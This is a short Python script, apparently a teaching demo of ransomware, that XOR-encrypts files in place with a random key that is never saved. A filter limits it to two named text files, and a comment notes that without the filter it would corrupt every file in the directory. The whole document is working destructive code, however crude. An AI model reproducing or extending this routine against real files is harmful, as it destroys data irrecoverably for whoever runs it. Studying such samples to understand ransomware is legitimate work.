import os

current_file = os.path.basename(__file__)

# List all files in the current directory 
# Note: Added filter so it only encrypts target files for safety however in real life this kind of attack could corrupt all files in directory
files = [f for f in os.listdir('.') if os.path.isfile(f) and (f == "emancipation_proclamation.txt" or f == "Pidgeons.txt")]

#Weak Encryption
key = os.urandom(500)
for file in files:
    f = open(file,'r+')
    contents = f.read()
    encrypt = ''
    k = 0
    for c in contents:
        encrypt += chr(ord(c) ^ key[k])
        k = (k + 1) % 500
    f.seek(0)
    f.write(encrypt)
